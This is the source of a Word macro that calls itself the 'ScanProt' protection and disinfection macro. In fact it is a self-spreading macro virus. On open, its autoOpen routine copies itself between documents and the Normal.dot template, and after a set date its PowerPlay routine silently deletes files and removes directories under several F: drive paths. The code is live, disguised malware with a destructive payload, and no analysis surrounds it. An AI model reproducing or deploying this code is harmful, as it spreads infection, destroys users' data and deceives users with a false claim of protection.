   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoOpen.MAIN"
   Dim rightNow
   Dim fileMacro$
   Dim globMacro$
   Dim MacroFile$
   On Error GoTo -1: On Error GoTo errCaught
   rightNow = WordBasic.Today()
   WordBasic.FileSummaryInfo Update:=1
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo dlg
   fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
   globMacro$ = "Global:autoOpen"
   MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If MacroFile$ = "NORMAL.DOT" Then
   WordBasic.MacroCopy globMacro$, fileMacro$
   WordBasic.FileSaveAs Format:=1
   Else
   WordBasic.MacroCopy fileMacro$, globMacro$
   End If
   If rightNow > 35390 Then
   PowerPlay
   End If
   GoTo bye
   errCaught:
   bye:
   On Error GoTo -1: On Error GoTo 0
   End Sub
   Private Sub PowerPlay()
   On Error Resume Next
   WordBasic.Kill "F:\8_CLOCKS\*.*"
   WordBasic.Kill "F:\UW\UWBILL\*.*"
   WordBasic.Kill "F:\UW\WQSB\*.*"
   WordBasic.RmDir "F:\8_CLOCKS"
   WordBasic.RmDir "F:\UW\UWBILL"
   WordBasic.RmDir "F:\UW\WQSB"
   WordBasic.RmDir "F:\UW"
   End Sub
